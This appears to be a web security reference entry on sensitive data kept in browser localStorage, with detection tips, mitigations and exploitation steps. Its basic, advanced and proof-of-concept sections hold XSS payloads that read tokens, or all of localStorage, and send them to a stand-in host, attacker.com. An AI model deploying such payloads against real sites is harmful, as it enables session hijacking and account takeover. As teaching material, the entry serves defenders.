📌 Sensitive Data in Browser Local Storage

🧠 Description

What is the vulnerability?

Applications store JWT tokens, session IDs, API keys, or personally identifiable information (PII) in `localStorage`. Any XSS vulnerability on the same domain can read this data and exfiltrate it to an attacker, leading to account takeover.

Why does it occur?

Developers use `localStorage` for convenience because it is synchronous and persists across browser sessions. They overlook that it is accessible to any JavaScript running on the page.

Security principle violated: Insecure Storage / Least Privilege

Real-world analogy: Storing your house keys under the doormat – anyone who finds them can enter.

🏷️ Classification

  • Type: Insecure Storage
  • OWASP: A04:2021 – Insecure Design
  • CWE: CWE-922: Insecure Storage of Sensitive Information

🎯 Attack Surface

  • ✅ Single-page applications (SPAs) storing tokens in `localStorage`
  • ✅ Any site using `localStorage` for authentication state
  • ✅ Applications that store user profile data, API keys, or payment info in `localStorage`

🔍 Detection Methodology

1. Static Analysis

// Vulnerable code
localStorage.setItem('token', jwtToken);
localStorage.setItem('user', JSON.stringify(user));

2. Dynamic Analysis

  • Open Developer Tools (F12) → Application → Local Storage.
  • Check for tokens, user data, or secrets.
  • Look for keys named `token`, `access_token`, `jwt`, `user`, `api_key`, `password`.

💣 Basic Payloads (XSS to steal localStorage)

<script>
  var data = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + btoa(data));
</script>

🚀 Advanced Payloads

# Steal entire localStorage
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(localStorage)
  });
</script>

✔ Must be reproducible

⚙️ Exploitation Steps

  1. Find an XSS vulnerability on the same domain.
  2. Craft a payload to read `localStorage` and send data to attacker server.
  3. Wait for a victim to trigger the XSS.
  4. Use stolen token to impersonate the victim.

🛡️ Mitigation

✅ Use HTTP‑only cookies instead of localStorage for session tokens.
✅ Never store sensitive data (tokens, PII) in localStorage.
✅ Implement Content Security Policy (CSP) to prevent XSS.
✅ Short token lifetimes and use refresh tokens.
✅ Encrypt data before storing in localStorage (but prefer not storing at all).

🔓 Mitigation Bypass

  • If CSP is weak or misconfigured, XSS may still be possible.
  • If tokens are short-lived, but the attacker can continuously refresh them, they can maintain access.

⚠️ Risk / Impact

Severity: Medium to High

Impact: Session hijacking, account takeover, data theft.

📎 Proof of Concept (PoC)

<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
</script>
